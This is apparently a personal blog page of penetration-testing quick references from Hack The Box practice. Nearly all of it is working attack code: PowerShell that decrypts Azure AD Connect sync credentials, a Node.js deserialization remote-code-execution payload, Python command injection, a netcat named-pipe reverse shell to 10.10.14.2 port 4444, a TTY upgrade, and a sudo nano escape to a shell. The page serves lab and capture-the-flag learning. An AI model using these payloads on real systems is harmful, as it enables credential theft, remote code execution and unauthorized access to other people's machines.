---
title: "Highlights"
date: 2020-01-03T20:06:24-05:00
draft: false
description: "Noteable Blog Highlights and Quick-References"
---

# Attacking Azure AD Password Hash Synchronization

**Key Reference:**   
https://blog.xpnsec.com/azuread-connect-for-redteam/

```powershell
Invoke-SQLCMD -Query "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration" -ServerInstance "MONTEVERDE" -Database "ADSync"

Invoke-SQLCMD -Query "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent" -ServerInstance "MONTEVERDE" -Database "ADSync"
```

```powershell
add-type -path "C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll"
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
```  



# Node.js deserialization exploit  

https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/  

```js
{"rce":"_$$ND_FUNC$$_function(){\n require('child_process').exec  
('uname -a', function(error, stdout, stderr)  
{ console.log(stdout) });  \n }  
()"}  
```  


In this case the () is javascripts way of immediate function invokation, the first part of the code will build the function. 

# Spawn Fully Interactive TTY
```bash
$ /bin/bash # drop out of zsh b/c not compatible
# get initial terminal session
$ ctrl-z
$ stty raw -echo # - indicates disabling the stopping of the echo
$ fg 
$ reset
```

# Shell Spawn Python

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```
# Python Command Injection

```python
__import__("os"); os.system("pwd")
```

# Python code injection w/import and backpiping

```bash
__import__("os").system("mknod /tmp/backpipe2 p && /bin/sh 0</tmp/backpipe2 | nc 10.10.14.2 4444 1>/tmp/backpipe2")
```

# Nano Escape

Opening nano as sudo we can then perform:
```bash
^R^X
Reset; sh 1>&0 2>&0
```
_Where ^R^X is ctrl+R and ctrl+X._

# HTB Writeups
[KringleCon 2019](https://medium.com/@rob.mccarthy31/kringlecon-2019-write-up-ca83081a330)
[OpenAdmin](../../post/htb/openadmin)
[Postman](../../post/htb/postman)
[Craft](../../post/htb/craft)
[Sneaky - Coming Soon](../../post/htb/sneaky)
[Traverxec - Coming Soon](../../post/htb/traverxec)

